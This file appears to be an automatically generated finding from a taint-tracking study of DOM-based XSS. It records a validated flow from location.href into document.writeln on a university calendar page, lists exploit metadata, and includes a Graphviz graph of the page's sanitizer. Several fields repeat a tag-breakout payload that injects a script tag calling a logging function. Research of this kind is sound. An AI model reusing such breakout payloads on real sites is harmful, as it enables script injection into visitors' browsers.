@@ -1,0 +1,82 @@
+// Finding: b1e72289-79c5-4e49-9a40-2199c249725a
+// Finding.url: https://example144.com/registrar/academics/academic-calendar.php##</iframe></style></script></object></embed></textarea><script>taintfoxLog('2626f69c17364c738598edf309d44a65')</script><!--/*
+// Finding.parentloc: https://example144.com/registrar/academics/academic-calendar.php##</iframe></style></script></object></embed></textarea><script>taintfoxLog('2626f69c17364c738598edf309d44a65')</script><!--/*
+// Finding.domain: example144.com
+// Finding.base_domain: example144.com
+// Finding.source: location.href
+// Finding.sink: document.writeln
+// Sanitizer.score: 1
+// Sanitizer.name: formatFileName
+// Sanitizer.location: https://example144.com/registrar/academics/academic-calendar.php##</iframe></style></script></object></embed></textarea><script>taintfoxLog('2626f69c17364c738598edf309d44a65')</script><!--/* - <anonymous>:253:9
+// Finding.begin: 339
+// Finding.end: 340
+// Finding.original_uuid: 05d937d7-01ec-477f-ae47-800717ad2a66
+// Finding.TwentyFiveMillionFlowsId: -1346202095
+// Finding.script: https://example144.com/registrar/academics/academic-calendar.php##</iframe></style></script></object></embed></textarea><script>taintfoxLog('2626f69c17364c738598edf309d44a65')</script><!--/*
+// Finding.line: 269
+// Exploit.uuid: 2626f69c-1736-4c73-8598-edf309d44a65
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: text
+// Exploit.content: A
+// Exploit.quote_type: None
+// Exploit.tag: None
+// Exploit.break_out: #</iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: #</iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 23
+// Exploit.end_taint_url: 24
+// Exploit.replace_begin_url: 57
+// Exploit.replace_end_url: 57
+// Exploit.replace_begin_param: 132
+// Exploit.replace_end_param: 132
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1909814929
+// DepGraph.sanitizer_hash: 1909814929
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="preg_replace"];
+n2 [shape=box, label="RegExp: /_|-/"];
+n3 [shape=box, label="Lit:  "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="regex_exec"];
+n6 [shape=box, label="RegExp: /(^|\s)[a-z]/"];
+n7 [shape=box, label="Lit: 0"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="strtoupper"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=box, label="Var: x"];
+n12 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n10 -> n5;
+n9 -> n10;
+n11 -> n9;
+n12 -> n11;
+}
